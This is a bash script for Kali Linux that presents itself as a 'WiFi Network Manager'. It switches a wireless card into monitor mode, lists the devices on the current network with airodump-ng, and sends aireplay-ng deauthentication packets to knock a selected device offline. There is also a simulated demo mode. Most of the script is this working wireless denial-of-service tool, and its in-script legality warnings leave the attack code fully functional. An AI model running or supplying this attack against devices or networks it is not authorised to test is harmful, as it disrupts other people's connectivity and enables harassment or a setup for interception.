#!/bin/bash

# WiFi Network Manager
# A tool for WiFi analysis, device scanning, and targeted device disconnection
# For Kali Linux

# Check if script is run as root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Dependencies check
dependencies=("airmon-ng" "airodump-ng" "aireplay-ng" "nmap" "macchanger" "nmcli" "ip")
missing_deps=0

echo -e "${BLUE}Checking dependencies...${NC}"
for dep in "${dependencies[@]}"; do
    if ! command -v $dep &> /dev/null; then
        echo -e "${RED}$dep is not installed.${NC}"
        missing_deps=1
    fi
done

if [ $missing_deps -eq 1 ]; then
    echo -e "${YELLOW}Please install missing dependencies with:${NC}"
    echo -e "${CYAN}sudo apt-get update && sudo apt-get install aircrack-ng nmap macchanger network-manager${NC}"
    exit 1
fi

# Trap ctrl-c and clean up
trap cleanup INT

cleanup() {
    echo -e "\n${YELLOW}Cleaning up...${NC}"
    # Reset interface if we put it in monitor mode
    if [ ! -z "$monitor_interface" ]; then
        airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    fi
    # Remove temporary files
    rm -f /tmp/airodump-* 2>/dev/null
    exit 0
}

# Get current interface and wifi information
get_wifi_info() {
    echo -e "${BLUE}Getting current WiFi information...${NC}"
    
    # Try to get the interface with an active connection
    current_interface=$(nmcli -t -f DEVICE,STATE device | grep ":connected" | cut -d':' -f1)
    
    if [ -z "$current_interface" ]; then
        echo -e "${YELLOW}No active WiFi connection found.${NC}"
        echo -e "${YELLOW}This could be because you're running in a virtual machine.${NC}"
        
        # List available network interfaces for user to choose
        echo -e "\n${BLUE}Available network interfaces:${NC}"
        available_interfaces=$(ip -o link show | awk -F': ' '{print $2}' | grep -v "lo")
        
        if [ -z "$available_interfaces" ]; then
            echo -e "${RED}No network interfaces detected.${NC}"
            echo -e "${YELLOW}For virtual machines, you may need to:${NC}"
            echo -e "  1. Configure your VM to use a bridged network adapter"
            echo -e "  2. Use a compatible USB WiFi adapter passed through to the VM"
            echo -e "  3. On VirtualBox, use 'Intel PRO/1000 MT Desktop' adapter in bridged mode"
            echo -e "\n${YELLOW}Would you like to proceed in demo mode with sample data? (y/n)${NC}"
            read -n 1 -r
            echo
            
            if [[ $REPLY =~ ^[Yy]$ ]]; then
                # Set demo values
                current_interface="wlan0"
                ssid="DemoWiFi"
                mac_address="00:11:22:33:44:55"
                signal_strength="75"
                security="WPA2"
                bssid="AA:BB:CC:DD:EE:FF"
                channel="6"
                demo_mode=1
            else
                read -p "Enter your WiFi interface name (e.g. wlan0): " current_interface
                
                if [ -z "$current_interface" ]; then
                    echo -e "${RED}No interface provided. Exiting.${NC}"
                    exit 1
                fi
            fi
        else
            # Show available interfaces and let user choose
            i=1
            declare -A interface_map
            
            echo "Available interfaces:"
            while read -r interface; do
                echo -e "${YELLOW}$i)${NC} $interface"
                interface_map[$i]=$interface
                ((i++))
            done <<< "$available_interfaces"
            
            read -p "Select interface number [1-$((i-1))]: " selection
            
            if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -lt "$i" ]; then
                current_interface=${interface_map[$selection]}
                echo -e "${GREEN}Selected interface: $current_interface${NC}"
            else
                read -p "Invalid selection. Enter interface name manually (e.g. wlan0): " current_interface
                
                if [ -z "$current_interface" ]; then
                    echo -e "${RED}No interface provided. Exiting.${NC}"
                    exit 1
                fi
            fi
        fi
    fi
    
    # Demo mode check
    if [ "${demo_mode:-0}" -eq 0 ]; then
        # Get SSID
        ssid=$(nmcli -t -f GENERAL.CONNECTION device show "$current_interface" 2>/dev/null | cut -d':' -f2)
        if [ -z "$ssid" ]; then
            ssid="Not connected"
        fi
        
        # Get MAC address
        mac_address=$(ip link show "$current_interface" 2>/dev/null | grep link/ether | awk '{print $2}')
        if [ -z "$mac_address" ]; then
            mac_address="Unknown"
        fi
        
        # Get signal strength and security
        if [ "$ssid" != "Not connected" ]; then
            signal_info=$(nmcli -f IN-USE,SIGNAL device wifi 2>/dev/null | grep "*" | awk '{print $2}')
            if [ -n "$signal_info" ]; then
                signal_strength=$signal_info
            else
                signal_strength="N/A"
            fi
            
            security_info=$(nmcli -f SECURITY device wifi 2>/dev/null | grep -A 1 IN-USE | tail -1 | xargs)
            if [ -n "$security_info" ]; then
                security=$security_info
            else
                security="N/A"
            fi
            
            bssid=$(nmcli -t -f GENERAL.BSSID device show "$current_interface" 2>/dev/null | cut -d':' -f2- | xargs)
            if [ -z "$bssid" ]; then
                bssid="N/A"
            fi
            
            channel_info=$(iwlist "$current_interface" channel 2>/dev/null | grep Current | sed 's/.*Channel \([0-9]*\).*/\1/')
            if [ -n "$channel_info" ]; then
                channel=$channel_info
            else
                channel="N/A"
            fi
        else
            signal_strength="N/A"
            security="N/A"
            bssid="N/A"
            channel="N/A"
        fi
    fi
    
    # Display WiFi info
    clear
    echo -e "${GREEN}====================================${NC}"
    echo -e "${GREEN}        WiFi Information           ${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${CYAN}Interface:${NC} $current_interface"
    echo -e "${CYAN}MAC Address:${NC} $mac_address"
    echo -e "${CYAN}SSID:${NC} $ssid"
    echo -e "${CYAN}BSSID:${NC} $bssid"
    echo -e "${CYAN}Channel:${NC} $channel"
    echo -e "${CYAN}Signal Strength:${NC} $signal_strength%"
    echo -e "${CYAN}Security:${NC} $security"
    
    # Show message if in demo mode
    if [ "${demo_mode:-0}" -eq 1 ]; then
        echo -e "${YELLOW}[RUNNING IN DEMO MODE]${NC}"
    fi
    
    echo -e "${GREEN}====================================${NC}"
    
    return 0
}

# Put interface in monitor mode
enable_monitor_mode() {
    # Check if in demo mode
    if [ "${demo_mode:-0}" -eq 1 ]; then
        echo -e "\n${BLUE}[DEMO] Simulating monitor mode activation...${NC}"
        sleep 1
        echo -e "${GREEN}[DEMO] Monitor mode simulated on ${current_interface}mon${NC}"
        monitor_interface="${current_interface}mon"
        return 0
    fi
    
    echo -e "\n${BLUE}Enabling monitor mode on $current_interface...${NC}"
    
    # Check if airmon-ng is available
    if ! command -v airmon-ng &> /dev/null; then
        echo -e "${RED}Required tool (airmon-ng) not found.${NC}"
        echo -e "${YELLOW}Would you like to proceed in demo mode instead? (y/n)${NC}"
        read -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            demo_mode=1
            enable_monitor_mode
            return $?
        else
            echo -e "${RED}Cannot continue without airmon-ng. Exiting.${NC}"
            exit 1
        fi
    fi
    
    # Kill processes that might interfere with monitor mode
    airmon-ng check kill > /dev/null 2>&1
    
    # Put interface in monitor mode
    airmon-ng start "$current_interface" > /dev/null 2>&1
    
    # Get the name of the monitor interface (might be different from original)
    monitor_interface=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
    
    if [ -z "$monitor_interface" ]; then
        # Try alternative naming convention
        monitor_interface="${current_interface}mon"
        if ! iwconfig "$monitor_interface" &>/dev/null; then
            echo -e "${RED}Failed to enable monitor mode.${NC}"
            echo -e "${YELLOW}This could be because your network adapter doesn't support monitor mode${NC}"
            echo -e "${YELLOW}or because you're running in a virtual machine.${NC}"
            echo -e "${YELLOW}Would you like to proceed in demo mode instead? (y/n)${NC}"
            read -n 1 -r
            echo
            
            if [[ $REPLY =~ ^[Yy]$ ]]; then
                demo_mode=1
                enable_monitor_mode
                return $?
            else
                echo -e "${RED}Cannot continue without monitor mode. Exiting.${NC}"
                exit 1
            fi
        fi
    fi
    
    echo -e "${GREEN}Monitor mode enabled on $monitor_interface${NC}"
    return 0
}

# Scan for connected devices
scan_devices() {
    # Check if we're in demo mode
    if [ "${demo_mode:-0}" -eq 1 ]; then
        # Demo mode with sample data
        clear
        echo -e "${GREEN}====================================${NC}"
        echo -e "${GREEN}    Connected Devices on $ssid     ${NC}"
        echo -e "${GREEN}====================================${NC}"
        echo -e "${YELLOW}[RUNNING IN DEMO MODE]${NC}"
        echo -e "${CYAN}MAC Address          Vendor/Device Type${NC}"
        echo -e "${GREEN}------------------------------------${NC}"
        
        # Sample device list for demo mode
        echo -e "${YELLOW}1)${NC} 9C:B6:D0:AA:BB:CC  Samsung Galaxy Phone"
        echo -e "${YELLOW}2)${NC} F8:FF:C2:11:22:33  Apple iPhone"
        echo -e "${YELLOW}3)${NC} 00:0C:29:44:55:66  VMware Virtual Machine"
        echo -e "${YELLOW}4)${NC} 08:00:27:77:88:99  VirtualBox Virtual Machine"
        echo -e "${YELLOW}5)${NC} 5C:CF:7F:AB:CD:EF  Dell Laptop"
        echo -e "${YELLOW}6)${NC} B8:27:EB:12:34:56  Raspberry Pi"
        echo -e "${GREEN}====================================${NC}"
        
        # Demo mode device selection
        echo -e "\n${BLUE}Would you like to disconnect a device? (y/n)${NC}"
        read -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            echo -e "${BLUE}Enter the number of the device to disconnect (1-6):${NC}"
            read device_number
            
            if ! [[ "$device_number" =~ ^[1-6]$ ]]; then
                echo -e "${RED}Invalid selection.${NC}"
                return 1
            fi
            
            # Sample MAC addresses for demo mode
            declare -A demo_macs
            demo_macs[1]="9C:B6:D0:AA:BB:CC"
            demo_macs[2]="F8:FF:C2:11:22:33"
            demo_macs[3]="00:0C:29:44:55:66"
            demo_macs[4]="08:00:27:77:88:99"
            demo_macs[5]="5C:CF:7F:AB:CD:EF"
            demo_macs[6]="B8:27:EB:12:34:56"
            
            # Simulate device disconnection
            echo -e "\n${BLUE}Preparing to disconnect device: ${demo_macs[$device_number]}${NC}"
            echo -e "${RED}Warning: Disconnecting devices from networks you don't own may be illegal.${NC}"
            echo -e "${YELLOW}Use this feature only on networks you own or have permission to test.${NC}"
            echo -e "${BLUE}How many deauthentication packets to send? (10-100, more = longer disconnection)${NC}"
            read packet_count
            
            # Validate input
            if ! [[ "$packet_count" =~ ^[0-9]+$ ]] || [ "$packet_count" -lt 10 ] || [ "$packet_count" -gt 100 ]; then
                echo -e "${RED}Invalid input. Using default of 30 packets.${NC}"
                packet_count=30
            fi
            
            echo -e "${BLUE}[DEMO] Simulating sending $packet_count deauthentication packets...${NC}"
            
            # Show spinner to simulate activity
            spin='-\|/'
            i=0
            end=$((SECONDS+5))
            
            while [ $SECONDS -lt $end ]; do
                i=$(( (i+1) % 4 ))
                printf "\r${BLUE}[DEMO] Deauthenticating: ${spin:$i:1} %d seconds remaining...${NC}" $((end-SECONDS))
                sleep .5
            done
            
            echo -e "\n${GREEN}[DEMO] Deauthentication attack completed.${NC}"
            echo -e "${YELLOW}[DEMO] In a real environment, the device would now be temporarily disconnected from the network.${NC}"
        fi
        
        return 0
    fi
    
    # Real mode (non-demo)
    if [ "$ssid" == "Not connected" ]; then
        echo -e "${RED}Not connected to any network. Cannot scan devices.${NC}"
        return 1
    fi
    
    echo -e "\n${BLUE}Scanning for connected devices on $ssid...${NC}"
    echo -e "${YELLOW}This will temporarily enable monitor mode.${NC}"
    read -p "Continue (y/n)? " -n 1 -r
    echo
    
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        return 1
    fi
    
    # Check if tools are available
    if ! command -v airmon-ng &> /dev/null || ! command -v airodump-ng &> /dev/null; then
        echo -e "${RED}Required tools (airmon-ng, airodump-ng) not found.${NC}"
        echo -e "${YELLOW}Would you like to proceed in demo mode instead? (y/n)${NC}"
        read -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            demo_mode=1
            scan_devices
            return $?
        else
            return 1
        fi
    fi
    
    # Enable monitor mode
    enable_monitor_mode
    
    # Create temporary files for scan results
    temp_file="/tmp/airodump-scan"
    
    echo -e "${BLUE}Scanning network traffic for 15 seconds...${NC}"
    echo -e "${YELLOW}Press Ctrl+C to stop scanning early${NC}"
    
    # Start airodump to collect data
    airodump_cmd="airodump-ng -c \"$channel\" --bssid \"$bssid\" -w \"$temp_file\" \"$monitor_interface\" > /dev/null 2>&1"
    eval $airodump_cmd &
    airodump_pid=$!
    
    # Show a spinner while scanning
    spin='-\|/'
    i=0
    end=$((SECONDS+15))
    
    while [ $SECONDS -lt $end ]; do
        i=$(( (i+1) % 4 ))
        printf "\r${BLUE}Scanning: ${spin:$i:1} %d seconds remaining...${NC}" $((end-SECONDS))
        sleep .5
    done
    
    # Kill airodump
    kill $airodump_pid 2>/dev/null
    wait $airodump_pid 2>/dev/null
    
    # Reset interface back to managed mode
    airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    service NetworkManager restart > /dev/null 2>&1
    
    # Wait for network to reconnect
    echo -e "\n${BLUE}Waiting for network to reconnect...${NC}"
    sleep 3
    
    # Parse the CSV file to get client information
    csv_file="${temp_file}-01.csv"
    
    if [ ! -f "$csv_file" ]; then
        echo -e "${RED}Scan results not found. Would you like to try demo mode? (y/n)${NC}"
        read -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            demo_mode=1
            scan_devices
            return $?
        fi
        return 1
    fi
    
    # Extract client information from CSV
    # Skip header lines and get the client section
    clients=$(awk -F, 'NR>5 {print $1","$6}' "$csv_file" | grep -v "Station MAC")
    
    if [ -z "$clients" ]; then
        echo -e "${RED}No clients found connected to this network.${NC}"
        return 1
    fi
    
    # Display the clients
    clear
    echo -e "${GREEN}====================================${NC}"
    echo -e "${GREEN}    Connected Devices on $ssid     ${NC}"
    echo -e "${GREEN}====================================${NC}"
    echo -e "${CYAN}MAC Address          Vendor/Device Type${NC}"
    echo -e "${GREEN}------------------------------------${NC}"
    
    declare -A device_list
    count=1
    
    while IFS=, read -r mac_addr power; do
        mac_addr=$(echo "$mac_addr" | xargs)
        
        # Use nmap to try to identify the device
        vendor=$(nmap --script broadcast-dhcp-discover -e "$current_interface" 2>/dev/null | grep -i "$mac_addr" -A 3 | grep "Vendor" | cut -d':' -f2 | xargs)
        
        # If vendor not found via DHCP, try MAC lookup
        if [ -z "$vendor" ]; then
            vendor=$(macchanger -l 2>/dev/null | grep "$(echo $mac_addr | cut -d':' -f1,2,3)" | cut -d' ' -f5- | xargs)
        fi
        
        # If still no vendor, try another approach or mark as unknown
        if [ -z "$vendor" ]; then
            # Try to identify device type based on MAC prefix
            if [[ "$mac_addr" == "00:0C:29"* ]]; then
                vendor="VMware Virtual Machine"
            elif [[ "$mac_addr" == "08:00:27"* ]]; then
                vendor="VirtualBox Virtual Machine"
            elif [[ "$mac_addr" == "00:1A:11"* ]]; then
                vendor="Google Device"
            elif [[ "$mac_addr" == "B8:27:EB"* || "$mac_addr" == "DC:A6:32"* ]]; then
                vendor="Raspberry Pi"
            elif [[ "$mac_addr" == "00:11:22"* ]]; then
                vendor="Android Device"
            elif [[ "$mac_addr" == "A4:C6:4F"* || "$mac_addr" == "00:25:00"* ]]; then
                vendor="Apple Device"
            else
                vendor="Unknown Device"
            fi
        fi
        
        echo -e "${YELLOW}$count)${NC} $mac_addr  $vendor"
        device_list[$count]=$mac_addr
        ((count++))
    done <<< "$clients"
    
    echo -e "${GREEN}====================================${NC}"
    
    # Option to select a device to deauthenticate
    echo -e "\n${BLUE}Would you like to disconnect a device? (y/n)${NC}"
    read -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${BLUE}Enter the number of the device to disconnect:${NC}"
        read device_number
        
        if [ -z "${device_list[$device_number]}" ]; then
            echo -e "${RED}Invalid selection.${NC}"
            return 1
        fi
        
        deauth_device "${device_list[$device_number]}"
    fi
    
    return 0
}

# Disconnect a device from the network
deauth_device() {
    target_mac=$1
    
    echo -e "\n${BLUE}Preparing to disconnect device: $target_mac${NC}"
    echo -e "${RED}Warning: Disconnecting devices from networks you don't own may be illegal.${NC}"
    echo -e "${YELLOW}Use this feature only on networks you own or have permission to test.${NC}"
    echo -e "${BLUE}How many deauthentication packets to send? (10-100, more = longer disconnection)${NC}"
    read packet_count
    
    # Validate input
    if ! [[ "$packet_count" =~ ^[0-9]+$ ]] || [ "$packet_count" -lt 10 ] || [ "$packet_count" -gt 100 ]; then
        echo -e "${RED}Invalid input. Using default of 30 packets.${NC}"
        packet_count=30
    fi
    
    # Check if in demo mode
    if [ "${demo_mode:-0}" -eq 1 ]; then
        echo -e "${BLUE}[DEMO] Simulating sending $packet_count deauthentication packets...${NC}"
        
        # Show spinner to simulate activity
        spin='-\|/'
        i=0
        end=$((SECONDS+5))
        
        while [ $SECONDS -lt $end ]; do
            i=$(( (i+1) % 4 ))
            printf "\r${BLUE}[DEMO] Deauthenticating: ${spin:$i:1} %d seconds remaining...${NC}" $((end-SECONDS))
            sleep .5
        done
        
        echo -e "\n${GREEN}[DEMO] Deauthentication attack completed.${NC}"
        echo -e "${YELLOW}[DEMO] In a real environment, the device would now be temporarily disconnected from the network.${NC}"
        return 0
    fi
    
    # Check if aireplay-ng is available
    if ! command -v aireplay-ng &> /dev/null; then
        echo -e "${RED}Required tool (aireplay-ng) not found.${NC}"
        echo -e "${YELLOW}Would you like to proceed in demo mode instead? (y/n)${NC}"
        read -n 1 -r
        echo
        
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            demo_mode=1
            deauth_device "$target_mac"
            return $?
        else
            return 1
        fi
    fi
    
    # Enable monitor mode
    enable_monitor_mode
    
    echo -e "${BLUE}Sending $packet_count deauthentication packets to $target_mac...${NC}"
    echo -e "${YELLOW}This will disconnect the device temporarily.${NC}"
    
    # Send deauth packets
    aireplay-ng -0 "$packet_count" -a "$bssid" -c "$target_mac" "$monitor_interface" > /dev/null 2>&1
    
    echo -e "${GREEN}Deauthentication attack completed.${NC}"
    
    # Reset interface back to managed mode
    airmon-ng stop "$monitor_interface" > /dev/null 2>&1
    service NetworkManager restart > /dev/null 2>&1
    
    echo -e "${BLUE}Waiting for network to reconnect...${NC}"
    sleep 3
    
    return 0
}

# Main menu
show_menu() {
    echo -e "\n${BLUE}What would you like to do?${NC}"
    echo -e "${YELLOW}1)${NC} Refresh WiFi information"
    echo -e "${YELLOW}2)${NC} Scan for connected devices"
    echo -e "${YELLOW}3)${NC} Exit"
    read -p "Select option [1-3]: " option
    
    case $option in
        1) get_wifi_info ;;
        2) scan_devices ;;
        3) cleanup ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
}

# Main program
clear
echo -e "${GREEN}====================================${NC}"
echo -e "${GREEN}  WiFi Manager for Kali Linux      ${NC}"
echo -e "${GREEN}====================================${NC}"
echo -e "${YELLOW}This tool allows you to analyze WiFi networks, scan connected devices,${NC}"
echo -e "${YELLOW}and selectively disconnect devices from your network.${NC}"
echo -e "${RED}Warning: Use responsibly and only on networks you own or have permission to test.${NC}"
echo -e "${GREEN}====================================${NC}"

# Get initial WiFi information
get_wifi_info

# Main loop
while true; do
    show_menu
done
